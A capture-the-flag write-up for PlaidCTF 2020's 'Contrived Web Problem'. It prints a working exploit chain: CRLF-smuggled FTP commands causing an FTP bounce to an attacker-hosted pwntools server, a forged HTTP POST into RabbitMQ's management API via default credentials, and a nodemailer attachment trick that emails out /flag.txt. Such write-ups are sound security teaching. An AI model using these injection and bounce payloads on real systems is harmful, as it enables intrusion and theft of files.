# Plaid 2020: Contrived Web Problem

## TL;DR

A carefully crafted HTTP request can smuggle in FTP commands, which we leverage to perform a [FTP bounce attack](https://en.wikipedia.org/wiki/FTP_bounce_attack). This inserts a RabbitMQ message which causes a service to add `flag.txt` as an attachment in an email sent to the attacker.

## Table of Contents:

* [Source Exploration](#source-exp)
  * [Identifying flag location](#flag-loc)
  * [Network analysis](#network)
* [Vulnerability Discovery](#vulns)
  * [Emailer: attach `flag.txt`](#emailer-flag)
  * [FTP command injection](#ftp-cmd-inject)
  * [RabbitMQ open management api](#rabbitmq-open)
* [Final Exploit](#exploit-final)

## Source Exploration<a name="source-exp"></a>

The task includes the source for six Docker services:

```
% tree -L 2
.
├── docker-compose.yaml
├── services
│   ├── api
│   ├── email
│   ├── ftp
│   ├── postgres
│   ├── rabbit
│   └── server
└── services.dockerfile

7 directories, 2 files
```

### Identifying flag location<a name="flag-loc"></a>

Within `docker-compose.yml` we see that the services `server`, `api`, and `email` are built from `services.dockerfile` with the argument `FLAG: "${P_FLAG}"`. This looks promising!

Reading `services.dockerfile`, we find the command `RUN echo $FLAG > /flag.txt`. So, we need to steal the file `/flag.txt` from within one of the docker containers: `server`, `api`, or `email`.

### Network analysis<a name="network"></a>

Looking back at `docker-compose.yml`, we discover that the only exposed network port is `8080`, which maps to the service `server`:

```yml
  server:
    restart: always
    image: server
    build:
      context: "./services/server"
      dockerfile: ../../services.dockerfile
      args:
        FLAG: "${P_FLAG}"
    environment:
      API: "api:4101"
    ports:
     - "8080:8080"
    networks:
      default:
        ipv4_address: 172.32.80.80
```

More source-reading of each service reveals the following network structure. Note that [sendgrid](https://sendgrid.com/) is a SaaS email infrastructure provider.

```
 <internet>
      |
      v
 +--------+
 | server |
 +--------+
      |
      v
   +-----+     +----------+
   | api |---->| postgres |
   +-----+     +----------+
    |   |
    |   |      +-----+
    |   +----->| ftp |
    v          +-----+
   +--------+
   | rabbit |
   +--------+
    |
    v
   +-------+               +----------+
   | email |--<external>-->| sendgrid |
   +-------+               +----------+
```

# Vulnerability Discovery<a name="vulns"></a>

We identify a few interesting vulnerabilities, and then chain them together later.

## Emailer: attach `flag.txt`<a name="emailer-flag"></a>

Within `services/email/index.ts` a simple callback accepts RabbitMQ messages and invokes the function `sendMail(..)`.

```js
channel.consume("email", async (msg) => {
    if (msg === null) {
        return;
    }
    channel.ack(msg);

    try {
        let data = JSON.parse(msg.content.toString());
        await transport.sendMail({
            from: "plaid2020problem@gmail.com",
            subject: "Your Account",
            ...data,
        });
    } catch (e) {
        console.error(e);
    }
})
```

The key to this exploit is `...data`, which is [spread syntax](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax) unpacking the message content, `data`. After reading [the docs](https://nodemailer.com/message/attachments/) for `nodemailer`, we realize that the following invocation will email us the flag:

```js
await transport.sendMail({
    from: "plaid2020problem@gmail.com",
    to: "youremail@example.com",
    subject: "Your Account",
    attachments: [
        {
            filename: "flag.txt",
            path: "/flag.txt"
        }
    ]
});
```

## FTP command injection<a name="ftp-cmd-inject"></a>

The next observation to make is in `services/api/index.ts`, where we have a suspicious amount of control over the FTP connection.

```js
let { url } = req.query;
let parsed = new URL(url);

// ...snip...

let username = decodeURIComponent(parsed.username);
let password = decodeURIComponent(parsed.password);
let filename = decodeURIComponent(parsed.pathname);
let ftpClient = await connectFtp({
    host: parsed.hostname,
    port: parsed.port !== "" ? parseInt(parsed.port) : undefined,
    user: username !== "" ? username : undefined,
    password: password !== "" ? password : undefined,
});
image = await ftpClient.get(filename);
```

Digging into the source for the `ftp` library, we see that `.get(...)` is vulnerable to command injection via the filename: `"/some/path\r\n{COMMAND}\r\n`. See: [`lib/connection.js:608`](https://github.com/mscdex/node-ftp/blob/7dff82fc049a52f51803bdffb95ec1de383f9fac/lib/connection.js#L608).


We observe that injecting the ftp command `PORT 192,168,1,1,0,10` (substituting your own IP/port) causes the remote server to open a connection to our IP. So we can craft an ftp bounce attack!


## RabbitMQ open management api<a name="rabbitmq-open"></a>

The RabbitMQ docker container sets up the web-based management portal with credentials username: `test`, password: `test`. We can play around in this portal by modifying `docker-compose.yml` to expose port `15672`.

```yml
  rabbit:
    image: rabbit
    restart: always
    build:
      context: "./services/rabbit"
      dockerfile: "./rabbit.dockerfile"
    environment:
      username: "test"
      password: "test"
    ports:
     - "15672:15672"
    networks:
      default:
        ipv4_address: 172.32.56.72
```

We quickly find a [HTTP POST api](https://rawcdn.githack.com/rabbitmq/rabbitmq-management/v3.8.3/priv/www/api/index.html) for publishing a message on a channel. This is useful, because we need to publish our own message to trigger the emailer vulnerability listed above.

# Final Exploit<a name="exploit-final"></a>

We begin by crafting a HTTP POST which RabbitMQ interprets as a publish message request. Make sure it has DOS line-endings, per HTTP spec. View the example below, `req.txt`:

```http
POST /api/exchanges/%2F/amq.default/publish HTTP/1.1
Host: rabbit:15672
Authorization: Basic dGVzdDp0ZXN0
Content-Type: text/plain;charset=UTF-8
Content-Length: <compute this manually>
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

{"vhost":"/","name":"amq.default","properties":{"delivery_mode":1,"headers":{}},"routing_key":"email","delivery_mode":"1","payload":"{\"to\": \"youremail@example.com\", \"subject\": \"hi, mom!\", \"text\": \"body\", \"attachments\": [{\"filename\": \"flag.txt\", \"path\": \"/flag.txt\"}]}","headers":{},"props":{},"payload_encoding":"string"}
```

Then, we stand up a remote server which will upload this file to the victim FTP server when it reaches out:

```python
# pwn.py
from pwn import *
from pwnlib.tubes.server import server
import time

b = open('req.txt', mode='rb').read()

while b.endswith(b'\r\n'):
    b = b[:-2]

b = b * 1000

s = server(5012)

print('wait for cxn')
while True:
    c = s.next_connection()
    print('got cxn')
    time.sleep(1)
    c.write(b)
    c.close()
    print('sent')
s.close()
```

We then trigger the exploit chain with a request (substituting your IP/port appropriately):


```js
const inject = '\r\nPORT 1,2,3,4,19,148' +
               '\r\nSTOR my_exp.txt' +
               '\r\nPORT 172,32,56,72,61,56' +
               '\r\nRETR my_exp.txt\r\n';
const encoded = encodeURIComponent(encodeURIComponent(inject));
fetch(`http://contrived.pwni.ng/api/image?url=ftp://ftp:21/${encoded}`);
```

The following events then occur:

1. `server` proxies the http request to `api`
2. `api` connects to `ftp` and, eventually, injects the command `PORT 1,2,3,4,19,148`
3. `ftp` establishes a connection to `1.2.3.4` port `5012` (= 19 * 256 + 148)
4. Our evil server hosted on `1.2.3.4` accepts the connection and pauses 1 second
5. `api` sends the command `STOR my_exp.txt` to `ftp`
6. Our evil server sends the file crafted to look like a POST, which `ftp` stores in `my_exp.txt`.
7. `api` sends the command `PORT 172,32,56,72,61,56` to `ftp`
8. `ftp` establishes a connection to the RabbitMQ HTTP API hosted at `172.32.56.72`, port `15672`.
9. `ftp` sends the contents of `my_exp.txt`. Note in `pwn.py` that we repeat the HTTP POST quite a few times. This ensures that `ftp` does not terminate the TCP connection too quickly, because it's busy sending more data. Closing the connection immediately causes RabbitMQ to ignore the request.
10. RabbitMQ interprets the file contents as HTTP, and publishes our message
11. `email` receives the message, and attaches the flag to an email which Sendgrid then delivers to our inbox.